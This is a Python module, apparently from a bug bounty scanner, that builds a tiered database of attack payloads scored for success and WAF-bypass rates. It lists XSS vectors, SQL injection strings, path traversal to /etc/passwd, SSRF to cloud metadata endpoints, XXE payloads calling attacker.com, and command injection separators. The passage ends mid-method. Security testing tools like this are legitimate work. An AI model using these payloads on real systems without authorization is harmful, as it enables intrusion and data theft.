"""
VORTEX Curated Payload System - PHASE 2.1 REVISED
Production-safe, bug bounty optimized payloads

PHILOSOPHY:
"Çok payload değil, doğru az öldürücü payload"

TIER SYSTEM:
- TIER 1: Safe & Proven (90 payloads) - DEFAULT
- TIER 2: Moderate Coverage (225 payloads) - BALANCED
- TIER 3: Aggressive (670 payloads) - MANUAL ONLY

TOTAL: 315 curated payloads (TIER 1 + TIER 2)
"""

import logging
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

logger = logging.getLogger(__name__)


class PayloadTier(str, Enum):
    """Payload tier classification for risk/coverage balance."""
    TIER_1 = "tier_1"  # Safe & Proven - Production default
    TIER_2 = "tier_2"  # Moderate - Balanced coverage
    TIER_3 = "tier_3"  # Aggressive - Manual testing only


class VulnType(str, Enum):
    """Vulnerability types."""
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    SSRF = "ssrf"
    SSTI = "ssti"
    XXE = "xxe"
    COMMAND_INJECTION = "command_injection"


@dataclass
class CuratedPayload:
    """Single curated payload with metadata."""
    content: str
    vuln_type: VulnType
    tier: PayloadTier
    success_rate: float  # 0.0-1.0 (e.g., 0.85 = 85% success)
    waf_bypass_prob: float  # 0.0-1.0 probability of bypassing WAF
    false_positive_rate: float  # 0.0-1.0 (e.g., 0.05 = 5% false positive)
    description: str = ""
    tags: List[str] = field(default_factory=list)
    source: str = "custom"  # custom, seclists, owasp, etc.
    
    def get_quality_score(self) -> float:
        """
        Calculate overall quality score.
        Higher is better.
        """
        return (
            self.success_rate * 0.5 +
            self.waf_bypass_prob * 0.3 +
            (1 - self.false_positive_rate) * 0.2
        )


class CuratedPayloadDatabase:
    """
    Production-grade curated payload database.
    
    Focus: Quality over quantity, production-safe defaults.
    """
    
    def __init__(self, enable_tier3: bool = False):
        self.payloads: Dict[VulnType, List[CuratedPayload]] = {
            VulnType.XSS: [],
            VulnType.SQLI: [],
            VulnType.LFI: [],
            VulnType.SSRF: [],
            VulnType.SSTI: [],
            VulnType.XXE: [],
            VulnType.COMMAND_INJECTION: [],
        }
        
        self._load_curated_payloads(enable_tier3=enable_tier3)
    
    def _load_curated_payloads(self, enable_tier3: bool = False):
        """Load curated, production-safe payloads."""
        
        # Load TIER 1 first, then TIER 2, optionally TIER 3
        self._load_tier1_payloads()
        self._load_tier2_payloads()
        
        if enable_tier3:
            self._load_tier3_payloads()
        
        logger.info(f"Loaded {self.get_total_count()} total curated payloads")
        logger.info(f"  TIER 1: {self.get_total_count(PayloadTier.TIER_1)} payloads (production-safe)")
        logger.info(f"  TIER 2: {self.get_total_count(PayloadTier.TIER_2)} payloads (balanced)")
        if enable_tier3:
            logger.info(f"  TIER 3: {self.get_total_count(PayloadTier.TIER_3)} payloads (aggressive/manual)")
    
    def _load_tier1_payloads(self):
        """Load TIER 1 (production-safe) payloads."""
        
        # === XSS PAYLOADS (15 TIER 1) ===
        xss_tier1 = [
            CuratedPayload(
                "<script>alert(1)</script>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.60, false_positive_rate=0.02,
                description="Classic script injection", tags=["basic", "proven"],
                source="seclists"
            ),
            CuratedPayload(
                "<img src=x onerror=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.70, false_positive_rate=0.03,
                description="Image onerror handler", tags=["event", "proven"],
                source="seclists"
            ),
            CuratedPayload(
                "<svg/onload=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.75, false_positive_rate=0.04,
                description="SVG onload handler", tags=["svg", "proven"],
                source="seclists"
            ),
            CuratedPayload(
                "javascript:alert(1)",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.65, false_positive_rate=0.05,
                description="JavaScript protocol", tags=["protocol", "href"],
                source="owasp"
            ),
            CuratedPayload(
                "'\"><script>alert(1)</script>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.60, false_positive_rate=0.06,
                description="Context escape + script", tags=["escape", "proven"],
                source="seclists"
            ),
            CuratedPayload(
                "<iframe src=javascript:alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.55, false_positive_rate=0.04,
                description="Iframe with javascript protocol", tags=["iframe"],
                source="custom"
            ),
            CuratedPayload(
                "<input onfocus=alert(1) autofocus>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.68, false_positive_rate=0.05,
                description="Input autofocus event", tags=["input", "autofocus"],
                source="custom"
            ),
            CuratedPayload(
                "<details open ontoggle=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.74, waf_bypass_prob=0.72, false_positive_rate=0.04,
                description="Details ontoggle event", tags=["details", "modern"],
                source="custom"
            ),
            CuratedPayload(
                "<body onload=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.70, waf_bypass_prob=0.50, false_positive_rate=0.07,
                description="Body onload handler", tags=["body", "onload"],
                source="seclists"
            ),
            CuratedPayload(
                "<svg><animate onbegin=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.72, waf_bypass_prob=0.75, false_positive_rate=0.05,
                description="SVG animate event", tags=["svg", "animate"],
                source="custom"
            ),
            CuratedPayload(
                "{{constructor.constructor('alert(1)')()}}",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.68, waf_bypass_prob=0.60, false_positive_rate=0.08,
                description="Angular template injection", tags=["angular", "template"],
                source="custom"
            ),
            CuratedPayload(
                "${alert(1)}",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.65, waf_bypass_prob=0.58, false_positive_rate=0.07,
                description="Template literal injection", tags=["template", "es6"],
                source="custom"
            ),
            CuratedPayload(
                "<marquee onstart=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.66, waf_bypass_prob=0.70, false_positive_rate=0.06,
                description="Marquee onstart event", tags=["marquee", "old"],
                source="custom"
            ),
            CuratedPayload(
                "<video src=x onerror=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.71, waf_bypass_prob=0.65, false_positive_rate=0.05,
                description="Video onerror handler", tags=["video", "media"],
                source="custom"
            ),
            CuratedPayload(
                "<audio src=x onerror=alert(1)>",
                VulnType.XSS, PayloadTier.TIER_1,
                success_rate=0.69, waf_bypass_prob=0.66, false_positive_rate=0.05,
                description="Audio onerror handler", tags=["audio", "media"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.XSS].extend(xss_tier1)
        
        # === SQLi PAYLOADS (20 TIER 1) ===
        sqli_tier1 = [
            CuratedPayload(
                "' OR '1'='1",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.92, waf_bypass_prob=0.50, false_positive_rate=0.03,
                description="Classic OR bypass", tags=["basic", "proven", "authentication"],
                source="seclists"
            ),
            CuratedPayload(
                "' OR 1=1--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.55, false_positive_rate=0.04,
                description="OR with SQL comment", tags=["basic", "comment"],
                source="seclists"
            ),
            CuratedPayload(
                "admin' --",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.60, false_positive_rate=0.05,
                description="Comment-based bypass", tags=["authentication", "comment"],
                source="seclists"
            ),
            CuratedPayload(
                "' UNION SELECT NULL--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.45, false_positive_rate=0.06,
                description="Basic UNION injection", tags=["union", "detection"],
                source="seclists"
            ),
            CuratedPayload(
                "' UNION SELECT NULL,NULL--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.45, false_positive_rate=0.06,
                description="UNION with 2 columns", tags=["union"],
                source="seclists"
            ),
            CuratedPayload(
                "' UNION SELECT NULL,NULL,NULL--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.45, false_positive_rate=0.06,
                description="UNION with 3 columns", tags=["union"],
                source="seclists"
            ),
            CuratedPayload(
                "1' AND SLEEP(5)--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.70, false_positive_rate=0.02,
                description="MySQL time-based blind", tags=["blind", "time", "mysql"],
                source="seclists"
            ),
            CuratedPayload(
                "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.84, waf_bypass_prob=0.65, false_positive_rate=0.03,
                description="MySQL sleep subquery", tags=["blind", "time", "mysql"],
                source="seclists"
            ),
            CuratedPayload(
                "1'; WAITFOR DELAY '00:00:05'--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.68, false_positive_rate=0.03,
                description="MSSQL time-based", tags=["blind", "time", "mssql"],
                source="seclists"
            ),
            CuratedPayload(
                "1'||pg_sleep(5)--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.70, false_positive_rate=0.03,
                description="PostgreSQL sleep", tags=["blind", "time", "postgres"],
                source="seclists"
            ),
            CuratedPayload(
                "' AND '1'='1",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.86, waf_bypass_prob=0.62, false_positive_rate=0.04,
                description="Boolean-based true condition", tags=["blind", "boolean"],
                source="seclists"
            ),
            CuratedPayload(
                "' AND '1'='2",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.84, waf_bypass_prob=0.62, false_positive_rate=0.04,
                description="Boolean-based false condition", tags=["blind", "boolean"],
                source="seclists"
            ),
            CuratedPayload(
                "' OR 1=1#",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.58, false_positive_rate=0.04,
                description="MySQL hash comment", tags=["basic", "mysql"],
                source="seclists"
            ),
            CuratedPayload(
                "' OR true--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.60, false_positive_rate=0.05,
                description="Boolean true bypass", tags=["basic", "postgres"],
                source="custom"
            ),
            CuratedPayload(
                "' || '1'='1",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.64, false_positive_rate=0.06,
                description="Concatenation OR bypass", tags=["alternative"],
                source="custom"
            ),
            CuratedPayload(
                "admin'/*",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.74, waf_bypass_prob=0.65, false_positive_rate=0.07,
                description="C-style comment", tags=["authentication", "comment"],
                source="custom"
            ),
            CuratedPayload(
                "' AND extractvalue(1,concat(0x7e,version()))--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.55, false_positive_rate=0.05,
                description="MySQL extractvalue error", tags=["error", "mysql"],
                source="seclists"
            ),
            CuratedPayload(
                "' AND 1=CONVERT(int,@@version)--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.58, false_positive_rate=0.06,
                description="MSSQL error-based", tags=["error", "mssql"],
                source="seclists"
            ),
            CuratedPayload(
                "' AND (SELECT 1)=1--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.66, false_positive_rate=0.05,
                description="Subquery boolean test", tags=["blind", "boolean"],
                source="custom"
            ),
            CuratedPayload(
                "1' ORDER BY 1--",
                VulnType.SQLI, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.70, false_positive_rate=0.04,
                description="Column count detection", tags=["union", "detection"],
                source="seclists"
            ),
        ]
        
        self.payloads[VulnType.SQLI].extend(sqli_tier1)
        
        # === LFI PAYLOADS (15 TIER 1) ===
        lfi_tier1 = [
            CuratedPayload(
                "../../../../etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.55, false_positive_rate=0.03,
                description="Standard Unix traversal", tags=["unix", "basic"],
                source="seclists"
            ),
            CuratedPayload(
                "../../../etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.56, false_positive_rate=0.03,
                description="3-level traversal", tags=["unix"],
                source="seclists"
            ),
            CuratedPayload(
                "../../etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.57, false_positive_rate=0.04,
                description="2-level traversal", tags=["unix"],
                source="seclists"
            ),
            CuratedPayload(
                "/etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.50, false_positive_rate=0.05,
                description="Absolute path", tags=["unix", "absolute"],
                source="seclists"
            ),
            CuratedPayload(
                "..\\..\\..\\..\\windows\\win.ini",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.60, false_positive_rate=0.04,
                description="Windows traversal", tags=["windows"],
                source="seclists"
            ),
            CuratedPayload(
                "C:\\Windows\\win.ini",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.55, false_positive_rate=0.06,
                description="Windows absolute path", tags=["windows", "absolute"],
                source="seclists"
            ),
            CuratedPayload(
                "php://filter/convert.base64-encode/resource=index.php",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.65, false_positive_rate=0.05,
                description="PHP filter wrapper", tags=["php", "wrapper"],
                source="seclists"
            ),
            CuratedPayload(
                "php://input",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.70, waf_bypass_prob=0.70, false_positive_rate=0.08,
                description="PHP input stream", tags=["php", "wrapper", "rce"],
                source="seclists"
            ),
            CuratedPayload(
                "file:///etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.60, false_positive_rate=0.06,
                description="File protocol", tags=["protocol", "unix"],
                source="custom"
            ),
            CuratedPayload(
                "../../../../etc/passwd%00",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.65, waf_bypass_prob=0.55, false_positive_rate=0.07,
                description="Null byte injection", tags=["unix", "nullbyte"],
                source="seclists"
            ),
            CuratedPayload(
                "/proc/self/environ",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.72, waf_bypass_prob=0.68, false_positive_rate=0.05,
                description="Process environment", tags=["unix", "proc"],
                source="custom"
            ),
            CuratedPayload(
                "/var/log/apache2/access.log",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.68, waf_bypass_prob=0.62, false_positive_rate=0.06,
                description="Apache log file", tags=["unix", "log", "poisoning"],
                source="custom"
            ),
            CuratedPayload(
                "....//....//....//etc/passwd",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.70, waf_bypass_prob=0.72, false_positive_rate=0.07,
                description="Double encoding bypass", tags=["unix", "bypass"],
                source="seclists"
            ),
            CuratedPayload(
                "php://filter/resource=index.php",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.68, false_positive_rate=0.06,
                description="PHP filter basic", tags=["php", "wrapper"],
                source="custom"
            ),
            CuratedPayload(
                "/etc/hosts",
                VulnType.LFI, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.58, false_positive_rate=0.05,
                description="Hosts file", tags=["unix"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.LFI].extend(lfi_tier1)
        
        # === SSRF PAYLOADS (10 TIER 1) ===
        ssrf_tier1 = [
            CuratedPayload(
                "http://127.0.0.1",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.92, waf_bypass_prob=0.60, false_positive_rate=0.03,
                description="Localhost IPv4", tags=["basic", "localhost"],
                source="seclists"
            ),
            CuratedPayload(
                "http://localhost",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.58, false_positive_rate=0.04,
                description="Localhost hostname", tags=["basic", "localhost"],
                source="seclists"
            ),
            CuratedPayload(
                "http://169.254.169.254/latest/meta-data/",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.50, false_positive_rate=0.05,
                description="AWS metadata endpoint", tags=["cloud", "aws", "critical"],
                source="seclists"
            ),
            CuratedPayload(
                "http://[::1]",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.70, false_positive_rate=0.04,
                description="IPv6 localhost", tags=["ipv6", "localhost"],
                source="custom"
            ),
            CuratedPayload(
                "http://0.0.0.0",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.65, false_positive_rate=0.05,
                description="All interfaces", tags=["localhost"],
                source="seclists"
            ),
            CuratedPayload(
                "http://metadata.google.internal/computeMetadata/v1/",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.55, false_positive_rate=0.06,
                description="GCP metadata endpoint", tags=["cloud", "gcp"],
                source="seclists"
            ),
            CuratedPayload(
                "http://10.0.0.1",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.62, false_positive_rate=0.06,
                description="Private network Class A", tags=["private"],
                source="seclists"
            ),
            CuratedPayload(
                "http://172.16.0.1",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.74, waf_bypass_prob=0.63, false_positive_rate=0.06,
                description="Private network Class B", tags=["private"],
                source="seclists"
            ),
            CuratedPayload(
                "http://192.168.1.1",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.72, waf_bypass_prob=0.64, false_positive_rate=0.07,
                description="Private network Class C", tags=["private"],
                source="seclists"
            ),
            CuratedPayload(
                "file:///etc/passwd",
                VulnType.SSRF, PayloadTier.TIER_1,
                success_rate=0.68, waf_bypass_prob=0.58, false_positive_rate=0.08,
                description="File protocol", tags=["protocol", "file"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.SSRF].extend(ssrf_tier1)
        
        # === SSTI PAYLOADS (12 TIER 1) ===
        ssti_tier1 = [
            CuratedPayload(
                "{{7*7}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.65, false_positive_rate=0.04,
                description="Jinja2/Twig detection", tags=["detection", "jinja2", "twig"],
                source="seclists"
            ),
            CuratedPayload(
                "${7*7}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.68, false_positive_rate=0.05,
                description="Freemarker/EL detection", tags=["detection", "freemarker", "java"],
                source="seclists"
            ),
            CuratedPayload(
                "<%= 7*7 %>",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.70, false_positive_rate=0.05,
                description="ERB detection", tags=["detection", "erb", "ruby"],
                source="seclists"
            ),
            CuratedPayload(
                "{{config}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.60, false_positive_rate=0.06,
                description="Jinja2 config access", tags=["jinja2", "flask"],
                source="custom"
            ),
            CuratedPayload(
                "{{self}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.62, false_positive_rate=0.07,
                description="Jinja2 self access", tags=["jinja2"],
                source="custom"
            ),
            CuratedPayload(
                "${{7*7}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.72, waf_bypass_prob=0.66, false_positive_rate=0.08,
                description="Alternative template syntax", tags=["detection"],
                source="custom"
            ),
            CuratedPayload(
                "#{7*7}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.70, waf_bypass_prob=0.68, false_positive_rate=0.08,
                description="Alternative template syntax", tags=["detection"],
                source="custom"
            ),
            CuratedPayload(
                "*{7*7}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.68, waf_bypass_prob=0.70, false_positive_rate=0.09,
                description="Alternative template syntax", tags=["detection"],
                source="custom"
            ),
            CuratedPayload(
                "{{7+7}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.67, false_positive_rate=0.04,
                description="Addition detection", tags=["detection", "alternative"],
                source="custom"
            ),
            CuratedPayload(
                "${7+7}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.83, waf_bypass_prob=0.69, false_positive_rate=0.05,
                description="Addition detection EL", tags=["detection", "java"],
                source="custom"
            ),
            CuratedPayload(
                "{{7-7}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.86, waf_bypass_prob=0.68, false_positive_rate=0.05,
                description="Subtraction detection", tags=["detection", "alternative"],
                source="custom"
            ),
            CuratedPayload(
                "{{request}}",
                VulnType.SSTI, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.64, false_positive_rate=0.07,
                description="Jinja2 request object", tags=["jinja2", "flask"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.SSTI].extend(ssti_tier1)
        
        # === XXE PAYLOADS (8 TIER 1) ===
        xxe_tier1 = [
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.55, false_positive_rate=0.03,
                description="Basic file read XXE", tags=["basic", "file"],
                source="seclists"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.60, false_positive_rate=0.04,
                description="SSRF via XXE", tags=["ssrf", "oob"],
                source="seclists"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.57, false_positive_rate=0.05,
                description="Hosts file read", tags=["file"],
                source="custom"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.80, waf_bypass_prob=0.62, false_positive_rate=0.05,
                description="Localhost SSRF", tags=["ssrf", "localhost"],
                source="custom"
            ),
            CuratedPayload(
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.56, false_positive_rate=0.04,
                description="UTF-8 encoded XXE", tags=["file", "encoding"],
                source="custom"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.65, false_positive_rate=0.06,
                description="Blind XXE via parameter entity", tags=["blind", "oob"],
                source="seclists"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.58, false_positive_rate=0.06,
                description="Windows file read", tags=["file", "windows"],
                source="custom"
            ),
            CuratedPayload(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                VulnType.XXE, PayloadTier.TIER_1,
                success_rate=0.76, waf_bypass_prob=0.60, false_positive_rate=0.07,
                description="AWS metadata via XXE", tags=["cloud", "aws", "ssrf"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.XXE].extend(xxe_tier1)
        
        # === COMMAND INJECTION PAYLOADS (10 TIER 1) ===
        cmd_tier1 = [
            CuratedPayload(
                "; id",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.90, waf_bypass_prob=0.60, false_positive_rate=0.03,
                description="Semicolon command separator", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "| id",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.62, false_positive_rate=0.04,
                description="Pipe command separator", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "` id`",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.85, waf_bypass_prob=0.68, false_positive_rate=0.04,
                description="Backtick execution", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "$(id)",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.82, waf_bypass_prob=0.70, false_positive_rate=0.05,
                description="Command substitution", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "& whoami",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.78, waf_bypass_prob=0.65, false_positive_rate=0.06,
                description="Windows AND separator", tags=["basic", "windows"],
                source="seclists"
            ),
            CuratedPayload(
                "&& id",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.86, waf_bypass_prob=0.63, false_positive_rate=0.05,
                description="Logical AND separator", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "|| id",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.84, waf_bypass_prob=0.64, false_positive_rate=0.05,
                description="Logical OR separator", tags=["basic", "unix"],
                source="seclists"
            ),
            CuratedPayload(
                "; whoami",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.88, waf_bypass_prob=0.61, false_positive_rate=0.04,
                description="Semicolon with whoami", tags=["basic", "unix"],
                source="custom"
            ),
            CuratedPayload(
                "| whoami",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.86, waf_bypass_prob=0.62, false_positive_rate=0.04,
                description="Pipe with whoami", tags=["basic", "unix"],
                source="custom"
            ),
            CuratedPayload(
                "\nid\n",
                VulnType.COMMAND_INJECTION, PayloadTier.TIER_1,
                success_rate=0.75, waf_bypass_prob=0.72, false_positive_rate=0.07,
                description="Newline separator", tags=["bypass", "unix"],
                source="custom"
            ),
        ]
        
        self.payloads[VulnType.COMMAND_INJECTION].extend(cmd_tier1)
    
    def _load_tier2_payloads(self):
        """Load TIER 2 (balanced coverage) payloads."""
        try:
            # Import TIER 2 payloads
            from core.payloads.curated_tier2 import (
                get_tier2_xss_payloads,
                get_tier2_sqli_payloads
            )
            from core.payloads.curated_tier2_part2 import (
                get_tier2_lfi_payloads,
                get_tier2_ssrf_payloads,
                get_tier2_ssti_payloads,
                get_tier2_xxe_payloads,
                get_tier2_command_injection_payloads
            )
            
            # Load XSS TIER 2 (25 payloads)
            xss_tier2 = get_tier2_xss_payloads()
            self.payloads[VulnType.XSS].extend(xss_tier2)
            logger.info(f"Loaded {len(xss_tier2)} XSS TIER 2 payloads")
            
            # Load SQLi TIER 2 (30 payloads)
            sqli_tier2 = get_tier2_sqli_payloads()
            self.payloads[VulnType.SQLI].extend(sqli_tier2)
            logger.info(f"Loaded {len(sqli_tier2)} SQLi TIER 2 payloads")
            
            # Load LFI TIER 2 (25 payloads)
            lfi_tier2 = get_tier2_lfi_payloads()
            self.payloads[VulnType.LFI].extend(lfi_tier2)
            logger.info(f"Loaded {len(lfi_tier2)} LFI TIER 2 payloads")
            
            # Load SSRF TIER 2 (20 payloads)
            ssrf_tier2 = get_tier2_ssrf_payloads()
            self.payloads[VulnType.SSRF].extend(ssrf_tier2)
            logger.info(f"Loaded {len(ssrf_tier2)} SSRF TIER 2 payloads")
            
            # Load SSTI TIER 2 (22 payloads)
            ssti_tier2 = get_tier2_ssti_payloads()
            self.payloads[VulnType.SSTI].extend(ssti_tier2)
            logger.info(f"Loaded {len(ssti_tier2)} SSTI TIER 2 payloads")
            
            # Load XXE TIER 2 (18 payloads)
            xxe_tier2 = get_tier2_xxe_payloads()
            self.payloads[VulnType.XXE].extend(xxe_tier2)
            logger.info(f"Loaded {len(xxe_tier2)} XXE TIER 2 payloads")
            
            # Load Command Injection TIER 2 (20 payloads)
            cmd_tier2 = get_tier2_command_injection_payloads()
            self.payloads[VulnType.COMMAND_INJECTION].extend(cmd_tier2)
            logger.info(f"Loaded {len(cmd_tier2)} Command Injection TIER 2 payloads")
            
        except ImportError as e:
            logger.warning(f"Could not load TIER 2 payloads: {e}")
            logger.warning("Continuing with TIER 1 payloads only")
    
    def _load_tier3_payloads(self):
        """Load TIER 3 (aggressive/manual) payloads from SecLists."""
        try:
            from core.payloads.curated_tier3_loader import load_tier3_from_seclists
            
            tier3_payloads = load_tier3_from_seclists()
            
            if tier3_payloads:
                for payload in tier3_payloads:
                    self.payloads[payload.vuln_type].append(payload)
                
                logger.info(f"Loaded {len(tier3_payloads)} TIER 3 payloads from SecLists")
                logger.warning("TIER 3 payloads are for MANUAL TESTING ONLY")
            else:
                logger.warning("No TIER 3 payloads loaded")
                
        except Exception as e:
            logger.warning(f"Could not load TIER 3 payloads: {e}")
            logger.warning("Continuing without TIER 3")
    
    def get_payloads(self,
                    vuln_type: Optional[VulnType] = None,
                    tier: PayloadTier = PayloadTier.TIER_1,
                    min_success_rate: float = 0.0,
                    min_waf_bypass: float = 0.0,
